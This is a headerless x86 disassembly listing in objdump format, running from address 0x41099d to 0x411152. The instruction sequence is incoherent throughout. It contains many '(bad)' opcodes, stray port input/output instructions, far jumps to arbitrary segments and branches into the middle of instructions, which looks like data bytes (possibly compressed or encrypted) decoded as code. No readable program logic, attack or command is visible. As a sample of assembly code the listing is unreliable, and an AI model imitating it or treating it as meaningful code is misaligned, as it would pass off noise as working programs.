  41099d:	jle    0x41096e
  41099f:	xor    esi,edx
  4109a1:	add    BYTE PTR [eax+ecx*1+0x10],ah
  4109a5:	mov    gs,ecx
  4109a7:	dec    ebx
  4109a8:	sbb    ecx,ebx
  4109aa:	mov    al,0x7a
  4109ac:	sub    DWORD PTR [ebp+0x5763f7ce],edi
  4109b2:	and    esi,DWORD PTR [edi]
  4109b4:	outs   dx,BYTE PTR ds:[esi]
  4109b5:	test   DWORD PTR [ebp-0x66],edx
  4109b8:	or     BYTE PTR [eax+0x5d9f4c55],dh
  4109be:	inc    edx
  4109bf:	ds dec edx
  4109c1:	sub    DWORD PTR [ebx-0x80],esp
  4109c4:	xchg   esp,eax
  4109c5:	sub    eax,0x3c7b585b
  4109ca:	in     al,0x67
  4109cc:	xchg   bh,dl
  4109ce:	es push es
  4109d0:	ins    BYTE PTR es:[edi],dx
  4109d1:	add    bl,BYTE PTR [edx]
  4109d3:	mov    cl,BYTE PTR ds:0x43e67acf
  4109d9:	jnp    0x410a45
  4109db:	js     0x4109d6
  4109dd:	and    BYTE PTR [edx-0x64],dl
  4109e0:	inc    ecx
  4109e1:	mov    esp,0xd43e2c89
  4109e6:	or     BYTE PTR [ecx-0x1e9ad382],dl
  4109ec:	jle    0x4109f1
  4109ee:	jno    0x410a3f
  4109f0:	sbb    BYTE PTR [esi-0x2a4ebaa2],0x2
  4109f7:	int3   
  4109f8:	outs   dx,DWORD PTR ds:[esi]
  4109f9:	pop    ds
  4109fa:	xchg   edx,eax
  4109fb:	dec    eax
  4109fc:	test   al,0xac
  4109fe:	sahf   
  4109ff:	push   esp
  410a00:	dec    edi
  410a01:	adc    al,0xb4
  410a03:	mov    ds:0x74171e7a,al
  410a08:	pop    eax
  410a09:	mov    edi,0x18c6663a
  410a0e:	in     eax,0x1b
  410a10:	mov    bh,0x9c
  410a12:	jo     0x410a48
  410a14:	inc    edi
  410a15:	jmp    0x1e25407c
  410a1a:	mov    esp,0x498772a5
  410a1f:	and    BYTE PTR [esi+ecx*4+0x30],dh
  410a23:	int3   
  410a24:	jmp    0x5f08:0xb7b6a2c9
  410a2b:	fcom   DWORD PTR [esi-0x7679e5c2]
  410a31:	pop    esp
  410a32:	pop    DWORD PTR [eax-0x5d]
  410a35:	mov    dh,0x51
  410a37:	and    dh,BYTE PTR [ebx+0x71151e88]
  410a3d:	ret    0xe6ab
  410a40:	adc    ecx,ebp
  410a42:	out    0xa8,eax
  410a44:	push   ss
  410a45:	pop    ebp
  410a46:	inc    ebx
  410a47:	xor    edx,ebx
  410a49:	retf   
  410a4a:	push   es
  410a4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a4c:	add    BYTE PTR [edx-0x7f],0x3d
  410a50:	mov    ds:0x5592ccf8,al
  410a55:	adc    DWORD PTR [edi+eiz*2+0x58],ecx
  410a59:	inc    ebx
  410a5a:	dec    esp
  410a5b:	xor    DWORD PTR [eax+0x62],ecx
  410a5e:	ins    BYTE PTR es:[edi],dx
  410a5f:	in     eax,0x8e
  410a61:	in     al,0xd5
  410a63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a64:	xchg   DWORD PTR [ecx],edx
  410a66:	cmp    BYTE PTR [ebp+0x1c],cl
  410a69:	push   esp
  410a6a:	ss xor eax,0x228a69a
  410a70:	mov    ds:0x3d3d93a6,al
  410a75:	xchg   ebp,eax
  410a76:	mov    ebx,0xf0726cd4
  410a7b:	cs mov edi,0x65760579
  410a81:	pop    es
  410a82:	rol    BYTE PTR [eax+0x19276e6c],1
  410a88:	clc    
  410a89:	leave  
  410a8a:	(bad)  
  410a8b:	push   ebx
  410a8c:	xor    eax,0xd0c97ed5
  410a91:	sub    eax,0x5591c8d6
  410a96:	fsubr  DWORD PTR [eax]
  410a98:	pop    edx
  410a99:	inc    ebx
  410a9a:	xor    al,0x1a
  410a9c:	jmp    0x5a7f5ba9
  410aa1:	ins    DWORD PTR es:[edi],dx
  410aa2:	stc    
  410aa3:	adc    ebx,esp
  410aa5:	add    eax,0xe36dca5d
  410aaa:	inc    eax
  410aab:	jle    0x410a95
  410aad:	enter  0x2962,0xaa
  410ab1:	(bad)  
  410ab3:	dec    edi
  410ab4:	add    al,0xac
  410ab6:	mov    ebx,0x2f2b05b1
  410abb:	imul   edx,DWORD PTR [ebx],0xbba1572f
  410ac1:	in     al,0x86
  410ac3:	retf   
  410ac4:	lea    ebp,[ebp-0x212274c5]
  410aca:	test   edi,0x77fe11c1
  410ad0:	pop    eax
  410ad1:	in     al,dx
  410ad2:	mov    dh,BYTE PTR [esi+0x55]
  410ad5:	mov    ds:0x4c5deeb,al
  410ada:	test   esp,0x41f72e3f
  410ae0:	call   0x59e2ec0b
  410ae5:	les    edi,FWORD PTR [esi]
  410ae7:	jecxz  0x410a82
  410ae9:	or     al,0x15
  410aeb:	cmp    dl,dh
  410aed:	ror    DWORD PTR [ebp-0x18],cl
  410af0:	jbe    0x410acb
  410af2:	push   ss
  410af3:	adc    ch,BYTE PTR [ecx+0x62]
  410af6:	ins    DWORD PTR es:[edi],dx
  410af7:	lods   al,BYTE PTR ds:[esi]
  410af8:	push   eax
  410af9:	sahf   
  410afa:	push   cs
  410afb:	jmp    0xa0739d51
  410b00:	adc    eax,0x527e50be
  410b05:	inc    esi
  410b06:	dec    ecx
  410b07:	cmp    ebx,DWORD PTR [ebx]
  410b09:	mov    ebx,0xfe29d34e
  410b0e:	lea    ebx,[eax+0x78]
  410b11:	xor    dl,dh
  410b13:	fwait
  410b14:	sbb    DWORD PTR [esi],0xffffffa1
  410b17:	cmp    dh,dh
  410b19:	ror    DWORD PTR [ebx+edi*4],1
  410b1c:	cmp    dl,ah
  410b1e:	mov    ds:0x208ba793,al
  410b23:	ds fdiv st(5),st
  410b26:	mov    edi,0x6a17af70
  410b2b:	mov    edi,eax
  410b2d:	ss dec ebx
  410b2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b30:	jo     0x410b7d
  410b32:	sub    al,0x5a
  410b34:	cpuid  
  410b36:	ins    BYTE PTR es:[edi],dx
  410b37:	mov    bl,0xa4
  410b39:	mov    ch,0x6d
  410b3b:	xor    BYTE PTR [ebp-0x6a9ef7df],dl
  410b41:	pop    ss
  410b42:	xchg   ebp,eax
  410b43:	cmp    DWORD PTR [edx],edx
  410b45:	adc    BYTE PTR [edi],cl
  410b47:	jmp    0x7f84:0xc266679c
  410b4e:	adc    al,0x97
  410b50:	(bad)  
  410b51:	jnp    0x410b6d
  410b53:	cwde   
  410b54:	inc    ecx
  410b55:	push   ds
  410b56:	daa    
  410b57:	cld    
  410b58:	xchg   edx,eax
  410b59:	(bad)
  410b5e:	jo     0x410b9e
  410b60:	xchg   edx,eax
  410b61:	lahf   
  410b62:	ficom  DWORD PTR [edi]
  410b64:	jns    0x410bac
  410b66:	(bad)  
  410b67:	sbb    bh,dl
  410b69:	fdivr  QWORD PTR [ebp-0x381477b0]
  410b6f:	jmp    0x8e84272c
  410b74:	cmc    
  410b75:	les    edx,FWORD PTR [ebp-0x33]
  410b78:	rcr    BYTE PTR [ebx-0x7bc95d42],1
  410b7e:	adc    BYTE PTR [edx+0x4d],dl
  410b81:	fcom   DWORD PTR [esp+ebp*1+0x5f]
  410b85:	js     0x410bda
  410b87:	inc    ecx
  410b88:	pusha  
  410b89:	sbb    al,0xe9
  410b8b:	mov    ds,WORD PTR [esi-0x64]
  410b8e:	adc    al,dh
  410b90:	add    eax,0x98708121
  410b95:	sub    esi,DWORD PTR [edi]
  410b97:	jo     0x410ba7
  410b99:	push   es
  410b9a:	sbb    bh,ch
  410b9c:	repnz xor esp,DWORD PTR [ebp+0x59]
  410ba0:	pop    es
  410ba1:	dec    eax
  410ba2:	pop    ecx
  410ba3:	clc    
  410ba4:	push   ss
  410ba5:	int    0x38
  410ba7:	xor    al,0x16
  410ba9:	pop    eax
  410baa:	or     ah,BYTE PTR [edx+0x78]
  410bad:	push   ecx
  410bae:	pop    ebp
  410baf:	clc    
  410bb0:	push   edi
  410bb1:	xchg   ebp,eax
  410bb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410bb3:	or     BYTE PTR [edx-0x6b],bh
  410bb6:	adc    DWORD PTR [edi-0x2e],esp
  410bb9:	test   al,0xb2
  410bbb:	jne    0x410c34
  410bbd:	(bad)  
  410bbe:	dec    eax
  410bbf:	iret   
  410bc0:	inc    eax
  410bc1:	jmp    0xc8881b60
  410bc6:	jns    0x410bf8
  410bc8:	jnp    0x410b59
  410bca:	adc    ch,BYTE PTR [eax+eiz*2-0x37]
  410bce:	cmp    eax,DWORD PTR [ebx]
  410bd0:	cmc    
  410bd1:	sub    BYTE PTR [edi+0x4f],ch
  410bd4:	push   edi
  410bd5:	mov    ebp,0x1741d4af
  410bda:	or     ecx,ecx
  410bdc:	pop    esi
  410bdd:	sub    dh,ch
  410bdf:	or     DWORD PTR ds:0xeec9bff9,0xffffff80
  410be6:	mov    ?,edx
  410be8:	jno    0x410c1f
  410bea:	sub    ebx,DWORD PTR [ebx]
  410bec:	xchg   esi,eax
  410bed:	jne    0x410b9f
  410bef:	add    ebx,DWORD PTR [esi-0x42]
  410bf2:	leave  
  410bf3:	jbe    0x410c69
  410bf5:	or     DWORD PTR [ebx],edi
  410bf7:	cmp    BYTE PTR [edx],0xa9
  410bfa:	pop    ds
  410bfb:	cld    
  410bfc:	jmp    0x1789:0x12a8cd14
  410c03:	jns    0x410be8
  410c05:	pushf  
  410c06:	test   eax,0x26fe577
  410c0b:	inc    ecx
  410c0c:	rcl    BYTE PTR [edi+0x51],0x39
  410c10:	(bad)
  410c15:	out    0x31,eax
  410c17:	push   eax
  410c18:	mov    cl,0x69
  410c1a:	cmp    BYTE PTR [ecx],ah
  410c1c:	icebp  
  410c1d:	je     0x410c95
  410c1f:	ins    DWORD PTR es:[edi],dx
  410c20:	mov    dh,0xec
  410c22:	in     eax,0x47
  410c24:	and    al,0x13
  410c26:	xchg   DWORD PTR [eax+0x496e409c],ebx
  410c2c:	fld    DWORD PTR [edi]
  410c2e:	mov    BYTE PTR [edi+0x1b829cc6],ch
  410c34:	std    
  410c35:	sub    DWORD PTR [edi*4+0x5501cdb2],esi
  410c3c:	ins    DWORD PTR es:[edi],dx
  410c3d:	clc    
  410c3e:	loope  0x410c3b
  410c40:	mov    eax,ds:0xa51db644
  410c45:	sub    BYTE PTR [ecx+0x58ba2e29],al
  410c4b:	mov    ecx,edi
  410c4d:	pop    es
  410c4e:	xor    eax,DWORD PTR [ebx+edx*2-0x2c]
  410c52:	aas    
  410c53:	mov    bl,0xbd
  410c55:	pop    ss
  410c56:	and    eax,0x8267f085
  410c5b:	mov    ah,0x51
  410c5d:	ds jno 0x410ca6
  410c60:	fstp   st(5)
  410c62:	mov    esp,0x3bb2baab
  410c67:	mov    eax,eax
  410c69:	pop    ss
  410c6a:	fsubr  st(7),st
  410c6c:	cmp    DWORD PTR [edx+0xd],edi
  410c6f:	mov    bh,0x77
  410c71:	cmc    
  410c72:	retf   
  410c73:	iret   
  410c74:	(bad)  
  410c75:	fisub  WORD PTR [esi+esi*2]
  410c78:	(bad)  [edi]
  410c7a:	out    dx,al
  410c7b:	pop    ebp
  410c7c:	push   ebp
  410c7d:	pop    edx
  410c7e:	cvtdq2ps xmm5,xmm7
  410c81:	adc    eax,0x8f554700
  410c86:	sbb    bh,BYTE PTR [ecx-0x17]
  410c89:	push   0xcf03a474
  410c8e:	cmp    ecx,DWORD PTR [esi+edx*8+0x9]
  410c92:	fnstcw WORD PTR [ecx]
  410c94:	call   0x7d43b058
  410c99:	aas    
  410c9a:	nop
  410c9b:	jle    0x410c69
  410c9d:	mov    ebx,0xf701dffd
  410ca2:	cmp    ebp,DWORD PTR [esi+edx*8]
  410ca5:	jnp    0x410c6a
  410ca7:	retf   
  410ca8:	in     al,0x28
  410caa:	mov    ebx,0x8094903d
  410caf:	in     al,0xe1
  410cb1:	lds    edx,FWORD PTR [eax-0x5ce46a87]
  410cb7:	arpl   WORD PTR [edi-0x5a3cb225],si
  410cbd:	hlt    
  410cbe:	push   esi
  410cbf:	sub    BYTE PTR [eax+0x5d8a7bcc],ah
  410cc5:	and    edx,esp
  410cc7:	mov    edi,0xc9286604
  410ccc:	ret    
  410ccd:	inc    edx
  410cce:	and    ch,BYTE PTR [ecx]
  410cd0:	mov    edi,0xee43a6d8
  410cd5:	or     eax,0x454666ac
  410cda:	cli    
  410cdb:	sbb    cl,BYTE PTR [eax]
  410cdd:	daa    
  410cde:	scas   al,BYTE PTR es:[edi]
  410cdf:	repz adc al,0x6b
  410ce2:	scas   eax,DWORD PTR es:[edi]
  410ce3:	push   ss
  410ce4:	mov    eax,0xfae3e7bd
  410ce9:	lahf   
  410cea:	scas   eax,DWORD PTR es:[edi]
  410ceb:	fs clc 
  410ced:	jle    0x410d52
  410cef:	pop    ebp
  410cf0:	push   ss
  410cf1:	(bad)  [esp+esi*2]
  410cf4:	push   esp
  410cf5:	add    DWORD PTR [ebp-0x694d2c94],edi
  410cfb:	or     al,BYTE PTR [edi+0x5d]
  410cfe:	bound  eax,QWORD PTR [edi+0x4a]
  410d01:	jno    0x410d3d
  410d03:	(bad)  
  410d04:	fisttp QWORD PTR [eax+eax*8-0x29]
  410d08:	inc    edx
  410d09:	dec    ecx
  410d0a:	or     DWORD PTR fs:[edi-0x73750686],0xc8172f89
  410d15:	inc    edi
  410d16:	xchg   esp,eax
  410d17:	add    ch,BYTE PTR [ecx-0x1460d04a]
  410d1d:	nop
  410d1e:	repnz test eax,0xb1f12b50
  410d24:	mov    WORD PTR [ebx+ecx*2+0x2af254c2],?
  410d2b:	jl     0x410d1d
  410d2d:	jb     0x410da0
  410d2f:	inc    esp
  410d30:	fimul  DWORD PTR [esi-0x258c14d2]
  410d36:	pop    edx
  410d37:	fnsave [edx-0x47]
  410d3a:	xlat   BYTE PTR ds:[ebx]
  410d3b:	pop    ecx
  410d3c:	dec    edi
  410d3d:	enter  0x4c40,0xb2
  410d41:	loope  0x410d9b
  410d43:	mov    bl,0x90
  410d45:	pop    esi
  410d46:	xor    edx,DWORD PTR [esp+ecx*1-0x3ce25c01]
  410d4d:	xchg   DWORD PTR [ebx-0x57691d0c],ebx
  410d53:	sub    ah,BYTE PTR [ecx+esi*8]
  410d56:	aas    
  410d57:	shl    DWORD PTR [ebx+0x5b],cl
  410d5a:	jmp    DWORD PTR [ecx+0x4f319c7a]
  410d60:	nop
  410d61:	inc    ecx
  410d62:	pop    es
  410d63:	sbb    al,0xa3
  410d65:	mov    ds:0xcb082e3e,al
  410d6a:	dec    edx
  410d6b:	sbb    DWORD PTR [edx],edi
  410d6d:	(bad)  
  410d6e:	fisttp QWORD PTR [edi]
  410d70:	in     al,dx
  410d71:	push   esp
  410d72:	mov    ch,0xfa
  410d74:	lahf   
  410d75:	xor    eax,0xaad0870d
  410d7a:	adc    eax,0xe875690c
  410d7f:	xor    eax,0xfb6893d
  410d84:	jecxz  0x410d34
  410d86:	add    eax,0xbb626f17
  410d8b:	push   DWORD PTR [eax]
  410d8d:	mov    ds,WORD PTR [ecx+0x11b014fb]
  410d93:	and    eax,0x5f45a38a
  410d98:	sbb    dl,bl
  410d9a:	call   0x8276eb39
  410d9f:	adc    ebp,DWORD PTR [edx-0x5e]
  410da2:	int3   
  410da3:	aas    
  410da4:	scas   eax,DWORD PTR es:[edi]
  410da5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410da6:	fistp  WORD PTR [ebx+0x3afd8885]
  410dac:	lods   al,BYTE PTR ds:[esi]
  410dad:	fsubrp st(6),st
  410daf:	scas   eax,DWORD PTR es:[edi]
  410db0:	mov    cl,0x96
  410db2:	jge    0x410d8a
  410db4:	(bad)  
  410db5:	loopne 0x410da9
  410db7:	jp     0x410d4c
  410db9:	sbb    ebp,0x71eac7a
  410dbf:	inc    edx
  410dc0:	jb     0x410d95
  410dc2:	mov    al,0xcb
  410dc4:	ffree  st(1)
  410dc6:	push   esi
  410dc7:	and    al,0xa2
  410dc9:	cmp    bh,0xed
  410dcc:	mov    WORD PTR [edi],fs
  410dce:	jbe    0x410dbd
  410dd0:	sbb    esi,DWORD PTR ds:[eax+0x1eaf9e23]
  410dd7:	call   0xeac16451
  410ddc:	(bad)  
  410ddd:	out    dx,al
  410dde:	fbld   TBYTE PTR [eax+esi*8-0x4f]
  410de2:	or     eax,0x328c1d90
  410de7:	jge    0x410dc1
  410de9:	sub    DWORD PTR ds:[ebx+esi*8-0x41db1d8d],eax
  410df1:	icebp  
  410df2:	push   esi
  410df3:	xor    al,0x32
  410df5:	lods   eax,DWORD PTR ds:[esi]
  410df6:	popa   
  410df7:	xchg   esp,eax
  410df8:	inc    esp
  410df9:	hlt    
  410dfa:	aas    
  410dfb:	nop
  410dfc:	hlt    
  410dfd:	pop    edx
  410dfe:	mov    bl,0x9e
  410e00:	fst    QWORD PTR [edi+ebp*1-0x5661cc22]
  410e07:	daa    
  410e08:	inc    ecx
  410e09:	retf   0xfcb2
  410e0c:	inc    ecx
  410e0d:	in     al,0xf2
  410e0f:	rcl    DWORD PTR [ecx+0x2a1722cd],1
  410e15:	hlt    
  410e16:	enter  0xa0d9,0x1c
  410e1a:	inc    ebx
  410e1b:	lahf   
  410e1c:	cmp    ebp,edx
  410e1e:	sbb    esp,ecx
  410e20:	mov    ebx,0xdea9c030
  410e25:	fisubr WORD PTR [ebp+0x73890bb1]
  410e2b:	adc    BYTE PTR [esi+0x5a],ah
  410e2e:	imul   edx,DWORD PTR [ecx+0x7bb00722],0xc978d393
  410e38:	push   eax
  410e39:	loop   0x410e59
  410e3b:	dec    eax
  410e3c:	inc    ebp
  410e3d:	gs (bad) 
  410e3f:	gs cdq 
  410e41:	jno    0x410ea7
  410e43:	or     BYTE PTR [edi-0xf],ah
  410e46:	loop   0x410e5d
  410e48:	icebp  
  410e49:	in     eax,0xe2
  410e4b:	mov    ah,0xca
  410e4d:	xchg   ebp,eax
  410e4e:	mov    cl,0xc5
  410e50:	pusha  
  410e51:	(bad)  
  410e53:	data16 mov bh,0xb
  410e56:	adc    al,0xea
  410e58:	imul   ecx,DWORD PTR [ebx],0xd8ea7679
  410e5e:	lahf   
  410e5f:	in     eax,0x12
  410e61:	rcr    ch,0x82
  410e64:	repnz sub ah,BYTE PTR [eax+eiz*4]
  410e68:	in     eax,dx
  410e69:	popf   
  410e6a:	(bad)  
  410e6b:	(bad)  [edi-0x6d]
  410e6e:	lea    ecx,[esi]
  410e70:	xlat   BYTE PTR ds:[ebx]
  410e71:	cld    
  410e72:	mov    DWORD PTR [esi],esi
  410e74:	xchg   BYTE PTR [edi+esi*1+0x34],bl
  410e78:	js     0x410e02
  410e7a:	jb     0x410ec5
  410e7c:	cmp    al,0x95
  410e7e:	dec    eax
  410e7f:	data16 cmc 
  410e81:	push   edi
  410e82:	cmp    eax,0x1d121593
  410e87:	jge    0x410e0b
  410e89:	dec    ebp
  410e8a:	inc    BYTE PTR [ebp+0x64]
  410e8d:	in     eax,dx
  410e8e:	outs   dx,DWORD PTR ds:[esi]
  410e8f:	xchg   ebp,eax
  410e90:	ds aam 0x7e
  410e93:	ficomp DWORD PTR [ebp+0x44]
  410e96:	mov    ds,WORD PTR [edi]
  410e98:	inc    eax
  410e99:	rol    BYTE PTR [edx-0x30dfc80c],1
  410e9f:	jecxz  0x410e8d
  410ea1:	in     eax,0x14
  410ea3:	inc    esi
  410ea4:	pop    edx
  410ea5:	daa    
  410ea6:	int3   
  410ea7:	or     eax,0x10b13b88
  410eac:	out    dx,al
  410ead:	stos   BYTE PTR es:[edi],al
  410eae:	das    
  410eaf:	jmp    0x410f15
  410eb1:	xchg   esi,eax
  410eb2:	xlat   BYTE PTR ds:[ebx]
  410eb3:	lahf   
  410eb4:	jge    0x410ed6
  410eb6:	lock inc esp
  410eb8:	pop    ss
  410eb9:	adc    DWORD PTR [ebx],edx
  410ebb:	push   0x3e958f89
  410ec0:	ins    BYTE PTR es:[edi],dx
  410ec1:	lea    eax,[ebp+0x723c1c46]
  410ec7:	push   ecx
  410ec8:	or     dl,dh
  410eca:	push   ebp
  410ecb:	lds    edi,FWORD PTR [esp+esi*8-0x66f98f8]
  410ed2:	jmp    0x410f08
  410ed4:	mov    dh,0x2e
  410ed6:	xor    al,0xcd
  410ed8:	(bad)  
  410ed9:	sbb    al,0x17
  410edb:	fwait
  410edc:	push   0x70
  410ede:	xor    BYTE PTR [edx-0x7],cl
  410ee1:	push   es
  410ee2:	aam    0xb4
  410ee4:	pop    ebp
  410ee5:	shl    BYTE PTR [esi+0x3a],1
  410ee8:	inc    edx
  410ee9:	dec    esp
  410eea:	cmp    al,bl
  410eec:	mov    dl,0xf
  410eee:	retf   0x45e5
  410ef1:	ret    0xb90f
  410ef4:	cli    
  410ef5:	repz sub DWORD PTR [ecx-0x6e6ca94e],ebx
  410efc:	cmp    BYTE PTR [edi+ecx*4],cl
  410eff:	push   edx
  410f00:	adc    ecx,DWORD PTR [ecx]
  410f02:	retf   0x9852
  410f05:	jmp    0x7b533993
  410f0a:	jns    0x410f06
  410f0c:	add    ecx,DWORD PTR [eax+0x4b68428d]
  410f12:	imul   esi,DWORD PTR [ecx-0x71],0xe7a8b690
  410f19:	out    0x6f,al
  410f1b:	aaa    
  410f1c:	fcmovbe st,st(0)
  410f1e:	daa    
  410f1f:	dec    ebx
  410f20:	pop    edi
  410f21:	cmp    cl,BYTE PTR [edx-0x60]
  410f24:	mov    eax,ds:0x5699bb
  410f29:	dec    edi
  410f2a:	shr    eax,0xda
  410f2d:	call   0xeb41bb6a
  410f32:	mov    ebp,0xa691ab2
  410f37:	(bad)  
  410f38:	ss mov esp,0xf1cc4bec
  410f3e:	push   cs
  410f3f:	bound  ebp,QWORD PTR cs:[edi]
  410f42:	nop
  410f43:	loop   0x410eec
  410f45:	push   0xffffff83
  410f47:	dec    eax
  410f48:	xchg   BYTE PTR [edi+0x5a],al
  410f4b:	fisttp WORD PTR [ebp+0x18]
  410f4e:	inc    edx
  410f4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f50:	inc    esp
  410f51:	jmp    0xaaa028fe
  410f56:	aam    0x15
  410f58:	hlt    
  410f59:	gs data16 into 
  410f5c:	mov    ebp,0x2c952414
  410f61:	jge    0x410fc5
  410f63:	xchg   edi,eax
  410f64:	jge    0x410f05
  410f66:	inc    eax
  410f67:	mov    cl,0x38
  410f69:	mov    ss,edi
  410f6b:	loop   0x410f1e
  410f6d:	inc    edi
  410f6e:	xchg   esi,eax
  410f6f:	push   ecx
  410f70:	shl    DWORD PTR [edx],1
  410f72:	xor    eax,0x1588e133
  410f77:	dec    esp
  410f78:	loope  0x410f87
  410f7a:	sbb    DWORD PTR [edx+0xe],edx
  410f7d:	loopne 0x410f0e
  410f7f:	and    eax,esi
  410f81:	fdivr  QWORD PTR [edx]
  410f83:	push   ss
  410f84:	lahf   
  410f85:	test   DWORD PTR ds:0x4f14d5d6,ebx
  410f8b:	iret   
  410f8c:	or     eax,0x40d3f121
  410f91:	call   0xb00f:0x2d5f97fa
  410f98:	jmp    0x81c3:0x7c77551e
  410f9f:	jb     0x410f41
  410fa1:	fisttp WORD PTR [ecx]
  410fa3:	fcomip st,st(7)
  410fa5:	inc    ecx
  410fa6:	pusha  
  410fa7:	es icebp 
  410fa9:	xor    esp,DWORD PTR [ebx+0x467e3687]
  410faf:	std    
  410fb0:	sbb    ecx,DWORD PTR [ecx+ecx*8]
  410fb3:	sar    dl,cl
  410fb5:	jb     0x410fae
  410fb7:	jg     0x41101e
  410fb9:	mov    bl,0x56
  410fbb:	pop    edx
  410fbc:	sahf   
  410fbd:	ds std 
  410fbf:	mov    eax,0x6da538dd
  410fc4:	imul   esp,DWORD PTR [eax+0x51],0x2de56107
  410fcb:	stos   DWORD PTR es:[edi],eax
  410fcc:	ret    0x71d8
  410fcf:	cmp    DWORD PTR ds:0xcdbaa7b8,ebx
  410fd5:	loope  0x411015
  410fd7:	pop    eax
  410fd8:	xor    BYTE PTR [esi+0x76],dl
  410fdb:	in     al,0x62
  410fdd:	cmc    
  410fde:	xor    ebp,ebx
  410fe0:	xchg   edx,eax
  410fe1:	adc    BYTE PTR [edx+0x6b143af7],ch
  410fe7:	push   es
  410fe8:	call   0x3290:0xbc988746
  410fef:	xchg   edx,eax
  410ff0:	jecxz  0x41105a
  410ff2:	sub    ebp,DWORD PTR [ecx+0x30de521d]
  410ff8:	jle    0x410fde
  410ffa:	cdq    
  410ffb:	mov    ch,dh
  410ffd:	aaa    
  410ffe:	cmp    DWORD PTR [edx],ebp
  411000:	lods   al,BYTE PTR ds:[esi]
  411001:	xor    ecx,DWORD PTR [edi-0x52]
  411004:	jecxz  0x41107f
  411006:	pusha  
  411007:	sub    dh,0xf6
  41100a:	xchg   esi,eax
  41100b:	sbb    BYTE PTR [eax+edx*8-0x6b],0x78
  411010:	jecxz  0x41108f
  411012:	lahf   
  411013:	lods   eax,DWORD PTR es:[esi]
  411015:	mov    DWORD PTR [bp+si],edi
  411018:	adc    eax,0xb3dc8145
  41101d:	loopne 0x410fae
  41101f:	(bad)  
  411020:	and    al,0x12
  411022:	dec    ecx
  411023:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411024:	mov    dh,0x92
  411026:	xor    eax,0x61b9a408
  41102b:	or     al,0x8c
  41102d:	outs   dx,BYTE PTR ds:[esi]
  41102e:	xlat   BYTE PTR ds:[ebx]
  41102f:	dec    BYTE PTR [edi]
  411031:	frstor [edx-0x18]
  411034:	icebp  
  411035:	xchg   edx,eax
  411036:	(bad)  
  411037:	outs   dx,DWORD PTR ds:[esi]
  411038:	cmp    eax,0xf057e5ff
  41103d:	std    
  41103e:	sti    
  41103f:	repz push cs
  411041:	ins    DWORD PTR es:[edi],dx
  411042:	jg     0x411068
  411044:	push   es
  411045:	fld    QWORD PTR [edi]
  411047:	mov    edx,0xbb72d9af
  41104c:	sbb    bl,cl
  41104e:	stos   DWORD PTR es:[edi],eax
  41104f:	clc    
  411050:	imul   edi,esi,0xffffffa8
  411053:	adc    DWORD PTR [ecx],ecx
  411055:	lods   al,BYTE PTR ds:[esi]
  411056:	mov    bl,0x64
  411058:	stos   BYTE PTR es:[edi],al
  411059:	div    DWORD PTR [edx-0x7fe24302]
  41105f:	mov    esi,0x38dbd941
  411064:	xchg   esi,eax
  411065:	ret    0x247a
  411068:	enter  0x8ece,0xa4
  41106c:	pop    es
  41106d:	inc    eax
  41106e:	aaa    
  41106f:	retf   
  411070:	inc    edi
  411071:	mov    esi,0x32f681a7
  411076:	push   edi
  411077:	cmp    BYTE PTR [esi-0x32e6ee67],dh
  41107d:	cmp    eax,0x1badb8e1
  411082:	test   eax,0x1aeb1e20
  411087:	stos   BYTE PTR es:[edi],al
  411088:	pop    ebp
  411089:	and    DWORD PTR [ecx-0x17],ebp
  41108c:	adc    cl,BYTE PTR [esi]
  41108e:	and    ch,BYTE PTR [esi-0x2e]
  411091:	pop    ebx
  411092:	aas    
  411093:	jle    0x41110c
  411095:	push   esp
  411096:	pop    eax
  411097:	icebp  
  411098:	hlt    
  411099:	xchg   esi,eax
  41109a:	dec    ebp
  41109b:	daa    
  41109c:	mov    edi,0xdb5f7e29
  4110a1:	adc    esp,ebp
  4110a3:	lock sbb DWORD PTR [edx-0x4e],0x1778ed97
  4110ab:	stos   BYTE PTR es:[edi],al
  4110ac:	cmp    eax,0x8cb2e61e
  4110b1:	ja     0x411074
  4110b3:	mov    al,0x7a
  4110b5:	imul   edx,DWORD PTR [eax-0x46],0xd14835cd
  4110bc:	adc    edx,ebx
  4110be:	not    DWORD PTR [ebp+esi*1-0x41]
  4110c2:	inc    eax
  4110c3:	or     dl,bl
  4110c5:	mov    ebp,0x3ffb5c63
  4110ca:	and    al,0xb8
  4110cc:	lods   al,BYTE PTR ds:[esi]
  4110cd:	push   eax
  4110ce:	adc    ebp,edi
  4110d0:	test   DWORD PTR [esp+eax*1],0xa7bdc83a
  4110d7:	add    ebx,DWORD PTR [ecx]
  4110d9:	(bad)  
  4110da:	mov    dl,BYTE PTR [esp+eiz*8-0x225e2e04]
  4110e1:	dec    eax
  4110e2:	cdq    
  4110e3:	xchg   esi,eax
  4110e4:	sahf   
  4110e5:	loop   0x411162
  4110e7:	fs leave 
  4110e9:	fs mov bl,0x58
  4110ec:	pop    esp
  4110ed:	ss cmc 
  4110ef:	in     al,dx
  4110f0:	aaa    
  4110f1:	pop    esp
  4110f2:	sahf   
  4110f3:	pop    esi
  4110f4:	mov    esi,0x4e7f1cae
  4110f9:	clc    
  4110fa:	mov    edx,0x27edb85e
  4110ff:	mov    al,ds:0xd1413363
  411104:	xor    eax,0x958b21ec
  411109:	scas   al,BYTE PTR es:[edi]
  41110a:	or     bl,0xac
  41110d:	lds    edi,FWORD PTR ss:[esi+0x1a0e0fc9]
  411114:	xor    al,0x52
  411116:	adc    DWORD PTR [ecx],ebx
  411118:	mov    dl,0xe1
  41111a:	sbb    DWORD PTR ds:0x3436716c,0x1a990dd9
  411124:	inc    edx
  411125:	add    al,0xa
  411127:	loope  0x4110ed
  411129:	shr    bl,cl
  41112b:	cmp    eax,DWORD PTR [ebp+ebp*2+0x18]
  41112f:	ss xchg edi,eax
  411131:	pushf  
  411132:	popf   
  411133:	push   es
  411134:	mov    ds:0x3a4a2108,al
  411139:	jmp    0x9768:0x8116c6a9
  411140:	popa   
  411141:	aad    0x24
  411143:	push   ecx
  411144:	out    0xf9,eax
  411146:	xor    esp,DWORD PTR [esi+0x5d]
  411149:	pop    ebx
  41114a:	or     ah,BYTE PTR [esi+0x692fc9c6]
  411150:	adc    al,0x84
  411152:	int3   
